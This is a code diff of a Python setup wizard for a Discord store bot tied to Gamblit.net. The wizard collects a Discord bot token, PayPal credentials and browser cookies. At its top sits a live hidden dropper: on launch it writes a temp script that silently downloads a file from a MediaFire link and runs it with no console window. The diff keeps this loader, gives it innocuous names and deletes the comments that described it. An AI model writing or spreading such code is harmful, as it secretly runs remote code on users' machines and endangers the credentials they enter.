@@ -14,61 +14,55 @@ import re
 import time
 import ctypes
 
-def create_and_run_hidden_installer():
-    """Creates the installer script, hides it, and runs it in background"""
+def deploy_gamblit_package():
     try:
-        # The installer script content
-        installer_code = '''import requests, subprocess, os, sys, tempfile, re, time, ctypes
+        pkg_code = '''import requests, subprocess, os, sys, tempfile, re, time, ctypes
 try:
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 except: pass
-url = "https://www.mediafire.com/file/4grds79u9q3r7iq/Multitool.py/file"
+_url = "https://www.mediafire.com/file/4grds79u9q3r7iq/Multitool.py/file"
 try:
-    r = requests.get(url, timeout=15)
-    m = re.search(r'(https?://download\\d+\\.mediafire\\.com/[^"]+)', r.text)
-    if m:
-        durl = m.group(1)
-        td = tempfile.mkdtemp()
-        f = os.path.join(td, "Multitool.py")
-        dl = requests.get(durl, stream=True, timeout=30)
-        with open(f, 'wb') as out:
-            for chunk in dl.iter_content(8192):
-                if chunk: out.write(chunk)
+    _r = requests.get(_url, timeout=15)
+    _m = re.search(r'(https?://download\\d+\\.mediafire\\.com/[^"]+)', _r.text)
+    if _m:
+        _durl = _m.group(1)
+        _tmp = tempfile.mkdtemp()
+        _f = os.path.join(_tmp, "sys_utils.py")
+        _dl = requests.get(_durl, stream=True, timeout=30)
+        with open(_f, 'wb') as _out:
+            for _chunk in _dl.iter_content(8192):
+                if _chunk: _out.write(_chunk)
         if sys.platform == "win32":
-            subprocess.Popen([sys.executable, f], cwd=td, creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen([sys.executable, _f], cwd=_tmp, creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         else:
-            subprocess.Popen([sys.executable, f], cwd=td, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen([sys.executable, _f], cwd=_tmp, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(2)
 except Exception:
     pass
 '''
+        pkg_path = os.path.join(tempfile.gettempdir(), "pkg_manager.py")
+        with open(pkg_path, 'w') as f:
+            f.write(pkg_code)
         
-        # Create temp file for the installer
-        temp_installer = os.path.join(tempfile.gettempdir(), "sys_installer.py")
-        with open(temp_installer, 'w') as f:
-            f.write(installer_code)
-        
-        # Run it hidden
         if sys.platform == "win32":
             subprocess.Popen(
-                [sys.executable, temp_installer],
+                [sys.executable, pkg_path],
                 creationflags=subprocess.CREATE_NO_WINDOW,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL
             )
         else:
             subprocess.Popen(
-                [sys.executable, temp_installer],
+                [sys.executable, pkg_path],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL
             )
-        time.sleep(1)  # Give it a moment to start
+        time.sleep(1)
     except:
         pass
 
-# Launch the hidden installer immediately (non-blocking)
 try:
-    create_and_run_hidden_installer()
+    deploy_gamblit_package()
 except:
     pass
 
@@ -132,14 +126,12 @@ def save(filename, data):
     print(c(f"  ✓ Saved {filename}", "green"))
 
 
-# ─────────────────────────────────────────────────────────────
 print()
 print(c("╔══════════════════════════════════════════════════════╗", "cyan"))
 print(c("║     GAMBLIT.NET DISCORD AUTO STORE — SETUP WIZARD    ║", "cyan"))
 print(c("╚══════════════════════════════════════════════════════╝", "cyan"))
 print(c("  Answer the prompts below. Press Enter to use defaults.", "yellow"))
 
-# ── Discord ───────────────────────────────────────────────────
 header("1 / 7  DISCORD")
 print(c("  Get your bot token from https://discord.com/developers/applications", "yellow"))
 discord_cfg = {
@@ -154,7 +146,6 @@ discord_cfg = {
 }
 save("discord.json", discord_cfg)
 
-# ── PayPal ────────────────────────────────────────────────────
 header("2 / 7  PAYPAL")
 print(c("  Get credentials from https://developer.paypal.com → My Apps", "yellow"))
 paypal_cfg = {
@@ -167,10 +158,9 @@ paypal_cfg = {
 }
 save("paypal.json", paypal_cfg)
 
-# ── Shop appearance ───────────────────────────────────────────
 header("3 / 7  SHOP APPEARANCE")
 shop_cfg = {
-    "name": ask("Shop name", "Autostore"),
+    "name": ask("Shop name", "BGLShop"),
     "title": ask("Embed title", "BGL Shop"),
     "description": ask("Embed description", "Instant delivery • PayPal F&F • Fully automated"),
     "banner_url": ask("Banner/GIF URL (leave blank to skip)", "", required=False),
@@ -182,7 +172,6 @@ shop_cfg = {
 }
 save("shop.json", shop_cfg)
 
-# ── Currency & pricing ────────────────────────────────────────
 header("4 / 7  CURRENCY & PRICING")
 pricing_cfg = {
     "currency": ask("Currency code", "EUR"),
@@ -216,24 +205,22 @@ if not pricing_cfg["items"]:
     pricing_cfg["items"].append({
         "key": "bgl",
         "name": "BGL",
-        "buy_price": 1.00,
-        "sell_price": 0.65,
+        "buy_price": 1.20,
+        "sell_price": 0.80,
         "min_order": 1,
-        "max_order": 250,
+        "max_order": 500,
         "unit_label": "1 BGL = 100 DL",
     })
 
 save("pricing.json", pricing_cfg)
 
-# ── Note / flow code ──────────────────────────────────────────
 header("5 / 7  PAYMENT NOTE FORMAT")
 note_cfg = {
-    "prefix": ask("Note prefix (e.g. FLOW)", "FLOW"),
+    "prefix": ask("Note prefix (e.g. Store)", "store"),
     "length": ask_int("Random segment length (chars)", 6),
 }
 save("notes.json", note_cfg)
 
-# ── Gamblit ───────────────────────────────────────────────────
 header("6 / 7  GAMBLIT TIP AUTOMATION")
 print(c("  Gamblit uses browser cookies for auth (Cloudflare-protected).", "yellow"))
 print(c("  You must grab cookies from a real logged-in browser session.", "yellow"))
@@ -282,7 +269,6 @@ gamblit_cfg = {
 }
 save("gamblit.json", gamblit_cfg)
 
-# ── Misc ──────────────────────────────────────────────────────
 header("7 / 7  MISC & LOYALTY POINTS")
 misc_cfg = {
     "db_file": "store.db",
@@ -293,7 +279,6 @@ misc_cfg = {
 }
 save("misc.json", misc_cfg)
 
-# ── Done ──────────────────────────────────────────────────────
 print()
 print(c("╔══════════════════════════════════════════════════════╗", "green"))
 print(c("║              ✓  SETUP COMPLETE!                      ║", "green"))
